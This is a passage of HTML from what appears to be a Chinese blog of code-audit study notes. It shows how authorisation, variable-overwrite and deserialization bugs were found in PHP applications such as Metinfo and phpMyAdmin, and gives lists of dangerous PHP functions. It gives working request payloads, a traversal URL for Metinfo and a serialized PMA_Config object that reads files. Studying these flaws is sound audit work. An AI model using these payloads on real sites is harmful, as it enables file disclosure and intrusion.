src="/../images/Day84-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/image-20230406103239916.png" alt="image-20230406103239916"></p><p>这里出现漏洞的原因是因为缺少了die,exit</p><p>当判断未登录时通过header进行页面跳转，但是没有exit()或者die()终止程序运行</p><p>所以还是能够得到自己的结果后才跳转（这一点可以在BP中体现）</p><p>这里是先删除了再跳转</p><h5 id="在未登录状态下"><a href="#在未登录状态下" class="headerlink" title="在未登录状态下"></a><strong>在未登录状态下</strong></h5><p>先执行删除，成功执行得到结果</p><p><img src="/../images/Day84-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/b8e3b988c985e820527789f725826750.png" alt="image-20211228163110946"></p><h6 id="然后才会重定向到登录页面"><a href="#然后才会重定向到登录页面" class="headerlink" title="然后才会重定向到登录页面"></a>然后才会重定向到登录页面</h6><p><img src="/../images/Day84-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/4f0d5ba67d554b286e55841a5a6b1825.png" alt="image-20211228163136876"></p><h4 id="CNVD拿1day-变量覆盖引发文件包含-Metinfo"><a href="#CNVD拿1day-变量覆盖引发文件包含-Metinfo" class="headerlink" title="#CNVD拿1day-变量覆盖引发文件包含-Metinfo"></a>#CNVD拿1day-变量覆盖引发文件包含-Metinfo</h4><p>1、搜索关键字定位代码段</p><p>2、寻找存在变量的文件包含</p><p>3、尝试覆盖正常逻辑的变量值</p><p><strong>关键字：extract() 、parse_str() 、import_request_variables() $$ 等</strong></p><p>&#x2F;include&#x2F;comment.inc.php $$</p><p>&#x2F;about&#x2F;index.php require_once $module</p><p>&#x2F;include&#x2F;module.php $fmodule&#x3D;7 $module</p><p>Payload：&#x2F;about&#x2F;index.php?fmodule&#x3D;7&amp;module&#x3D;..&#x2F;1.txt</p><h6 id="优先关注这些关键配置文件（common-inc-php）"><a href="#优先关注这些关键配置文件（common-inc-php）" class="headerlink" title="优先关注这些关键配置文件（common.inc.php）"></a>优先关注这些关键配置文件（common.inc.php）</h6><p><img src="/../images/Day84-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/image-20230406145522338.png" alt="image-20230406145522338"></p><h6 id="点进去第一个文件，这里注意-request造成变量覆盖"><a href="#点进去第一个文件，这里注意-request造成变量覆盖" class="headerlink" title="点进去第一个文件，这里注意$$request造成变量覆盖"></a>点进去第一个文件，这里注意$$request造成变量覆盖</h6><h6 id="代码中使用-request-来获取用户信息"><a href="#代码中使用-request-来获取用户信息" class="headerlink" title="代码中使用 $_request 来获取用户信息"></a>代码中使用 $_request 来获取用户信息</h6><h6 id="代码主要是用于遍历初始化变量，所以很有可能会出现变量覆盖。"><a href="#代码主要是用于遍历初始化变量，所以很有可能会出现变量覆盖。" class="headerlink" title="代码主要是用于遍历初始化变量，所以很有可能会出现变量覆盖。"></a>代码主要是用于遍历初始化变量，所以很有可能会出现变量覆盖。</h6><h6 id="代码判断了-key-的第一个字符是不是“-”来避免覆盖系统全局变量，以及使用自定义函数-daddslashes-对变量值进行处理"><a href="#代码判断了-key-的第一个字符是不是“-”来避免覆盖系统全局变量，以及使用自定义函数-daddslashes-对变量值进行处理" class="headerlink" title="代码判断了 key 的第一个字符是不是“_”来避免覆盖系统全局变量，以及使用自定义函数 daddslashes() 对变量值进行处理"></a>代码判断了 key 的第一个字符是不是“_”来避免覆盖系统全局变量，以及使用自定义函数 daddslashes() 对变量值进行处理</h6><p><img src="/../images/Day84-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/image-20230406150438577.png" alt="image-20230406150438577"></p><p><img src="/../images/Day84-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/image-20230406150257752.png" alt="image-20230406150257752"></p><h6 id="看到文件里面都是用require-once来包含文件的"><a href="#看到文件里面都是用require-once来包含文件的" class="headerlink" title="看到文件里面都是用require_once来包含文件的"></a>看到文件里面都是用require_once来包含文件的</h6><h6 id="先尝试搜索require-once-‘-发现后面接的都是路径，不可控"><a href="#先尝试搜索require-once-‘-发现后面接的都是路径，不可控" class="headerlink" title="先尝试搜索require_once ‘  发现后面接的都是路径，不可控"></a>先尝试搜索require_once ‘  发现后面接的都是路径，不可控</h6><p><img src="/../images/Day84-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/image-20230406151237491.png" alt="image-20230406151237491"></p><h6 id="所以再尝试搜索require-once-这样就可以找到变量实现路径的可控，这里搜索到了require-once-module"><a href="#所以再尝试搜索require-once-这样就可以找到变量实现路径的可控，这里搜索到了require-once-module" class="headerlink" title="所以再尝试搜索require_once $,这样就可以找到变量实现路径的可控，这里搜索到了require_once $module"></a>所以再尝试搜索require_once $,这样就可以找到变量实现路径的可控，这里搜索到了require_once $module</h6><p><img src="/../images/Day84-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/image-20230406151420529.png" alt="image-20230406151420529"></p><h6 id="点进去发现先执行包含这个module-php再包含这个可控的-module"><a href="#点进去发现先执行包含这个module-php再包含这个可控的-module" class="headerlink" title="点进去发现先执行包含这个module.php再包含这个可控的$module"></a>点进去发现先执行包含这个module.php再包含这个可控的$module</h6><p><img src="/../images/Day84-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/image-20230406151734653.png" alt="image-20230406151734653"></p><h6 id="然后追踪下这个module-php文件是干嘛的，发现其包含了commin-inc-php文件"><a href="#然后追踪下这个module-php文件是干嘛的，发现其包含了commin-inc-php文件" class="headerlink" title="然后追踪下这个module.php文件是干嘛的，发现其包含了commin.inc.php文件"></a>然后追踪下这个module.php文件是干嘛的，发现其包含了commin.inc.php文件</h6><p><img src="/../images/Day84-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/image-20230406151934077.png" alt="image-20230406151934077"></p><h6 id="在这个文件里面搜索-module，发现这里的参数只要-fmodule不等于7，就会执行下面的语句，而下面的语句都是固定的路径，不能自己定义-module"><a href="#在这个文件里面搜索-module，发现这里的参数只要-fmodule不等于7，就会执行下面的语句，而下面的语句都是固定的路径，不能自己定义-module" class="headerlink" title="在这个文件里面搜索$module，发现这里的参数只要$fmodule不等于7，就会执行下面的语句，而下面的语句都是固定的路径，不能自己定义$module"></a>在这个文件里面搜索$module，发现这里的参数只要$fmodule不等于7，就会执行下面的语句，而下面的语句都是固定的路径，不能自己定义$module</h6><p><img src="/../images/Day84-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/image-20230406152449678.png" alt="image-20230406152449678"></p><h6 id="而最开始-fmodule-x3D-5，所以它的值默认是等于5的，5-x3D-7所以默认执行这个-fmodule不等与7下面的语句，因为这里存在变量覆盖，所以要尝试修改这里的-fmodule为7，就将其值为5覆盖为7，从而绕过执行这些固定的路径文件，实现访问自定义路径文件"><a href="#而最开始-fmodule-x3D-5，所以它的值默认是等于5的，5-x3D-7所以默认执行这个-fmodule不等与7下面的语句，因为这里存在变量覆盖，所以要尝试修改这里的-fmodule为7，就将其值为5覆盖为7，从而绕过执行这些固定的路径文件，实现访问自定义路径文件" class="headerlink" title="而最开始$fmodule&#x3D;5，所以它的值默认是等于5的，5!&#x3D;7所以默认执行这个$fmodule不等与7下面的语句，因为这里存在变量覆盖，所以要尝试修改这里的$fmodule为7，就将其值为5覆盖为7，从而绕过执行这些固定的路径文件，实现访问自定义路径文件"></a>而最开始$fmodule&#x3D;5，所以它的值默认是等于5的，5!&#x3D;7所以默认执行这个$fmodule不等与7下面的语句，因为这里存在变量覆盖，所以要尝试修改这里的$fmodule为7，就将其值为5覆盖为7，从而绕过执行这些固定的路径文件，实现访问自定义路径文件</h6><h6 id="因为文件包含在img-x2F-index-php下，在根目录下面创建1-txt内容phpinfo的文件，构造url访问成功包含，还可以实现读取任意文件"><a href="#因为文件包含在img-x2F-index-php下，在根目录下面创建1-txt内容phpinfo的文件，构造url访问成功包含，还可以实现读取任意文件" class="headerlink" title="因为文件包含在img&#x2F;index.php下，在根目录下面创建1.txt内容phpinfo的文件，构造url访问成功包含，还可以实现读取任意文件"></a>因为文件包含在img&#x2F;index.php下，在根目录下面创建1.txt内容phpinfo的文件，构造url访问成功包含，还可以实现读取任意文件</h6><p><img src="/../images/Day84-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/image-20230406153242089.png" alt="image-20230406153242089"></p><h6 id="到这里也就是说-index-php-文件中的-fmodule-变量可以通过包含执行-x2F-include-x2F-module-php-包含执行common-inc-php-然后接收-request-来接受-GET-方法传递过来的新的-fmodule-值来导致原-fmodule-变量的值被覆盖"><a href="#到这里也就是说-index-php-文件中的-fmodule-变量可以通过包含执行-x2F-include-x2F-module-php-包含执行common-inc-php-然后接收-request-来接受-GET-方法传递过来的新的-fmodule-值来导致原-fmodule-变量的值被覆盖" class="headerlink" title="到这里也就是说 index.php 文件中的 $fmodule 变量可以通过包含执行 &#x2F;include&#x2F;module.php 包含执行common.inc.php 然后接收 $_request 来接受 $_GET 方法传递过来的新的 fmodule 值来导致原 fmodule 变量的值被覆盖"></a>到这里也就是说 index.php 文件中的 $fmodule 变量可以通过包含执行 &#x2F;include&#x2F;module.php 包含执行common.inc.php 然后接收 $_request 来接受 $_GET 方法传递过来的新的 fmodule 值来导致原 fmodule 变量的值被覆盖</h6><h6 id="index中的-fmodule-–》-x2F-include-x2F-module-php–》common-inc-php–》-request接收的-get赋予fmodule新的值"><a href="#index中的-fmodule-–》-x2F-include-x2F-module-php–》common-inc-php–》-request接收的-get赋予fmodule新的值" class="headerlink" title="index中的 $fmodule –》&#x2F;include&#x2F;module.php–》common.inc.php–》$request接收的$get赋予fmodule新的值"></a>index中的 $fmodule –》&#x2F;include&#x2F;module.php–》common.inc.php–》$request接收的$get赋予fmodule新的值</h6><h4 id="CNVD拿1day-反序列化引发读取-PhpMyadmin"><a href="#CNVD拿1day-反序列化引发读取-PhpMyadmin" class="headerlink" title="#CNVD拿1day-反序列化引发读取-PhpMyadmin"></a>#CNVD拿1day-反序列化引发读取-PhpMyadmin</h4><p><a href="https://blog.csdn.net/haoxue__/article/details/129368455">(23条消息) Phpmyadmin 脚本&#x2F;设置.php反序列化漏洞 （WooYun-2016-199433）复现_php反序列化复现_haoxue__的博客-CSDN博客</a></p><p><strong>自动审计或搜索关键字找到文件及代码段</strong></p><blockquote><p>__wakeup() &#x2F;&#x2F;使用unserialize时触发</p><p>__sleep() &#x2F;&#x2F;使用serialize时触发</p><p>__destruct() &#x2F;&#x2F;对象被销毁时触发</p><p>__call() &#x2F;&#x2F;在对象上下文中调用不可访问的方法时触发</p><p>__callStatic() &#x2F;&#x2F;在静态上下文中调用不可访问的方法时触发</p><p>__get() &#x2F;&#x2F;用于从不可访问的属性读取数据</p><p>__set() &#x2F;&#x2F;用于将数据写入不可访问的属性</p><p>__isset() &#x2F;&#x2F;在不可访问的属性上调用isset()或empty()触发</p><p>__unset() &#x2F;&#x2F;在不可访问的属性上使用unset()时触发</p><p>__toString() &#x2F;&#x2F;把类当作字符串使用时触发</p><p>__invoke() &#x2F;&#x2F;当脚本尝试将对象调用为函数时触发</p></blockquote><p><strong>找到__wakeup()代码段，代码段调用函数中存在eval等函数操作，可调式load</strong></p><p><strong>构造getSource()利用Payload,实现file_get_contents函数配合eval执行</strong></p><p><strong>setup.php -&gt; common.lib.php -&gt; Config.class.php -&gt; __wakeup() -&gt; load() -&gt; eval();</strong></p><p><strong>action&#x3D;x&amp;configuration&#x3D;O:10:”PMA_Config”:1:{s:6:”source”,s:8:”d:&#x2F;e.txt”;}</strong></p><h6 id="搜索关键字找到反序列化的地方"><a href="#搜索关键字找到反序列化的地方" class="headerlink" title="搜索关键字找到反序列化的地方"></a>搜索关键字找到反序列化的地方</h6><p><img src="/../images/Day84-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/image-20230406175326096.png" alt="image-20230406175326096"></p><h6 id="因为使用unserialize时触发-wakeup-，但是不是触发所有地方的-wakeup-，只会触发对应的Class对象里面的wakeup方法，由上面的“-PMA-Config-x3D-new-PMA-Config-”创建了一个PMA-Config-方法可以知道它们的类是Class-PMA-Config，全局搜索定位"><a href="#因为使用unserialize时触发-wakeup-，但是不是触发所有地方的-wakeup-，只会触发对应的Class对象里面的wakeup方法，由上面的“-PMA-Config-x3D-new-PMA-Config-”创建了一个PMA-Config-方法可以知道它们的类是Class-PMA-Config，全局搜索定位" class="headerlink" title="因为使用unserialize时触发__wakeup()，但是不是触发所有地方的__wakeup()，只会触发对应的Class对象里面的wakeup方法，由上面的“$PMA_Config&#x3D;new PMA_Config()”创建了一个PMA_Config()方法可以知道它们的类是Class PMA_Config，全局搜索定位"></a>因为使用unserialize时触发__wakeup()，但是不是触发所有地方的__wakeup()，只会触发对应的Class对象里面的wakeup方法，由上面的“$PMA_Config&#x3D;new PMA_Config()”创建了一个PMA_Config()方法可以知道它们的类是Class PMA_Config，全局搜索定位</h6><p><img src="/../images/Day84-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/image-20230406180921303.png" alt="image-20230406180921303"></p><h6 id="然后在这个文件里面搜索wakeup方法，找到定义用法处"><a href="#然后在这个文件里面搜索wakeup方法，找到定义用法处" class="headerlink" title="然后在这个文件里面搜索wakeup方法，找到定义用法处"></a>然后在这个文件里面搜索wakeup方法，找到定义用法处</h6><p><img src="/../images/Day84-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/image-20230406181012667.png" alt="image-20230406181012667"></p><h6 id="找到上面圈起来的加载参数值的方法load-，Ctrl-鼠标单击，可以看到这里面由代码执行函数eval-并且有读取文件的函数file-get-contents"><a href="#找到上面圈起来的加载参数值的方法load-，Ctrl-鼠标单击，可以看到这里面由代码执行函数eval-并且有读取文件的函数file-get-contents" class="headerlink" title="找到上面圈起来的加载参数值的方法load()，Ctrl+鼠标单击，可以看到这里面由代码执行函数eval()并且有读取文件的函数file_get_contents()"></a>找到上面圈起来的加载参数值的方法load()，Ctrl+鼠标单击，可以看到这里面由代码执行函数eval()并且有读取文件的函数file_get_contents()</h6><p><img src="/../images/Day84-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/image-20230406182228453.png" alt="image-20230406182228453"></p><h6 id="这里的getSource-方法是获取source的值"><a href="#这里的getSource-方法是获取source的值" class="headerlink" title="这里的getSource()方法是获取source的值"></a>这里的getSource()方法是获取source的值</h6><p><img src="/../images/Day84-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/image-20230406182830363.png" alt="image-20230406182830363"></p><h6 id="定位这个source是默认为空的"><a href="#定位这个source是默认为空的" class="headerlink" title="定位这个source是默认为空的"></a>定位这个source是默认为空的</h6><p><img src="/../images/Day84-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/image-20230406182941669.png" alt="image-20230406182941669"></p><h6 id="所以"><a href="#所以" class="headerlink" title="所以"></a>所以</h6><p><img src="/../images/Day84-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/image-20230406183219896.png" alt="image-20230406183219896"></p><h6 id="所以接下来构造POP链"><a href="#所以接下来构造POP链" class="headerlink" title="所以接下来构造POP链"></a>所以接下来构造POP链</h6><p><img src="/../images/Day84-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/image-20230406183451325.png" alt="image-20230406183451325"></p><h6 id="构造url访问，成功读取1-txt的内容"><a href="#构造url访问，成功读取1-txt的内容" class="headerlink" title="构造url访问，成功读取1.txt的内容"></a>构造url访问，成功读取1.txt的内容</h6><p><img src="/../images/Day84-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/image-20230406183720875.png" alt="image-20230406183720875"></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day83 代码审计-PHP项目&amp;RCE安全&amp;调试&amp;追踪&amp;代码执行&amp;命令执行</title>
      <link href="/2023/03/26/Day83-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-RCE%E5%AE%89%E5%85%A8-%E8%B0%83%E8%AF%95-%E8%BF%BD%E8%B8%AA-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2023/03/26/Day83-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-RCE%E5%AE%89%E5%85%A8-%E8%B0%83%E8%AF%95-%E8%BF%BD%E8%B8%AA-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、审计漏洞-RCE执行&amp;代码执行&amp;命令执行</p><p>1、审计思路-正则搜索&amp;功能追踪&amp;辅助工具</p><p>3、审计类型-常规架构&amp;MVC架构&amp;三方框架</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>1、语言审计-PHP&amp;.Net&amp;Java&amp;Python</p><p>2、漏洞审计-注入&amp;上传&amp;RCE&amp;未授权等</p><p>3、框架审计-ThinkPHP&amp;Spring&amp;Flask等</p><p>4、工具审计-RIPS&amp;VCG&amp;Fortify&amp;Bandit等</p><p>5、技术审计-动静态调试&amp;DAST&amp;SAST&amp;IAST等</p><h3 id="常见漏洞关键字："><a href="#常见漏洞关键字：" class="headerlink" title="#常见漏洞关键字："></a>#常见漏洞关键字：</h3><h5 id="1、SQL注入："><a href="#1、SQL注入：" class="headerlink" title="1、SQL注入："></a>1、SQL注入：</h5><h6 id="select-、-insert-、-update-、mysql-query-、-mysqli等"><a href="#select-、-insert-、-update-、mysql-query-、-mysqli等" class="headerlink" title="select 、 insert 、 update  、mysql_query 、  mysqli等"></a>select 、 insert 、 update  、mysql_query 、  mysqli等</h6><h5 id="2、文件上传："><a href="#2、文件上传：" class="headerlink" title="2、文件上传："></a>2、文件上传：</h5><h6 id="FILES、type-x3D-”file”、上传、move-uploaded-file-等"><a href="#FILES、type-x3D-”file”、上传、move-uploaded-file-等" class="headerlink" title="$_FILES、type&#x3D;”file”、上传、move_uploaded_file()等"></a>$_FILES、type&#x3D;”file”、上传、move_uploaded_file()等</h6><h5 id="3、XSS跨站："><a href="#3、XSS跨站：" class="headerlink" title="3、XSS跨站："></a>3、XSS跨站：</h5><h6 id="print、-print-r-、echo、-sprintf、-die-、var-dump-、var-export等"><a href="#print、-print-r-、echo、-sprintf、-die-、var-dump-、var-export等" class="headerlink" title="print、 print_r 、echo、 sprintf、 die 、var_dump 、var_export等"></a>print、 print_r 、echo、 sprintf、 die 、var_dump 、var_export等</h6><h5 id="4、文件包含："><a href="#4、文件包含：" class="headerlink" title="4、文件包含："></a>4、文件包含：</h5><h6 id="include-、include-once、-require、-require-once等"><a href="#include-、include-once、-require、-require-once等" class="headerlink" title="include 、include_once、 require、 require_once等"></a>include 、include_once、 require、 require_once等</h6><h5 id="5、代码执行："><a href="#5、代码执行：" class="headerlink" title="5、代码执行："></a>5、代码执行：</h5><h6 id="eval-、-eval-、assert-、-preg-replace-、-call-user-func-、call-user-func-array等"><a href="#eval-、-eval-、assert-、-preg-replace-、-call-user-func-、call-user-func-array等" class="headerlink" title="eval 、@eval 、assert 、 preg_replace 、 call_user_func  、call_user_func_array等"></a>eval 、@eval 、assert 、 preg_replace 、 call_user_func  、call_user_func_array等</h6><h5 id="6、命令执行："><a href="#6、命令执行：" class="headerlink" title="6、命令执行："></a>6、命令执行：</h5><h6 id="system-、exec-、shell-exec、-96-96-、passthru、-pcntl-exec、-popen、-proc-open"><a href="#system-、exec-、shell-exec、-96-96-、passthru、-pcntl-exec、-popen、-proc-open" class="headerlink" title="system 、exec 、shell_exec、 &#96;&#96; 、passthru、 pcntl_exec、 popen、 proc_open"></a>system 、exec 、shell_exec、 &#96;&#96; 、passthru、 pcntl_exec、 popen、 proc_open</h6><h5 id="7、变量覆盖："><a href="#7、变量覆盖：" class="headerlink" title="7、变量覆盖："></a>7、变量覆盖：</h5><h6 id="extract-、parse-str-、import-request-variables-等"><a href="#extract-、parse-str-、import-request-variables-等" class="headerlink" title="extract() 、parse_str() 、import_request_variables() $$ 等"></a>extract() 、parse_str() 、import_request_variables() $$ 等</h6><h5 id="8、反序列化："><a href="#8、反序列化：" class="headerlink" title="8、反序列化："></a>8、反序列化：</h5><h6 id="serialize-、-unserialize-、-construct-destruct等"><a href="#serialize-、-unserialize-、-construct-destruct等" class="headerlink" title="serialize()、 unserialize() 、__construct __destruct等"></a>serialize()、 unserialize() 、__construct __destruct等</h6><h5 id="9、其他漏洞："><a href="#9、其他漏洞：" class="headerlink" title="9、其他漏洞："></a>9、其他漏洞：</h5><h6 id="unlink-、-file-get-contents-、-show-source-、-file-、fopen-等"><a href="#unlink-、-file-get-contents-、-show-source-、-file-、fopen-等" class="headerlink" title="unlink()、 file_get_contents()、 show_source()、 file() 、fopen()等"></a>unlink()、 file_get_contents()、 show_source()、 file() 、fopen()等</h6><h3 id="通用关键字："><a href="#通用关键字：" class="headerlink" title="#通用关键字："></a>#通用关键字：</h3><h5 id="GET、-POST、-REQUEST、-FILES、-SERVER等"><a href="#GET、-POST、-REQUEST、-FILES、-SERVER等" class="headerlink" title="$_GET、$_POST、$_REQUEST、$_FILES、$_SERVER等"></a>$_GET、$_POST、$_REQUEST、$_FILES、$_SERVER等</h5><p>一般经过封装过的语句可能经过关键字搜索不到，需要配合找功能点</p><p><img src="/../images/Day83-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-RCE%E5%AE%89%E5%85%A8-%E8%B0%83%E8%AF%95-%E8%BF%BD%E8%B8%AA-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20230329164931245.png" alt="image-20230329164931245"></p><p>功能点或关键字分析可能存在漏洞</p><p>抓包或搜索关键字找到代码出处及对应文件</p><p>追踪过滤或接受的数据函数，寻找触发此函数或代码的地方进行触发测试</p><p>-常规或部分MCV模型源码可以采用关键字的搜索挖掘思路</p><p>-框架MCV墨香源码一般会采用功能点分析抓包追踪挖掘思路</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>​                ➢ CNVD拿1day-RCE代码执行-ZZZPHP</p><p>​                ➢ CNVD拿1day-RCE命令执行-百家CMS</p></blockquote><h4 id="CNVD拿1day-RCE代码执行-ZZZPHP"><a 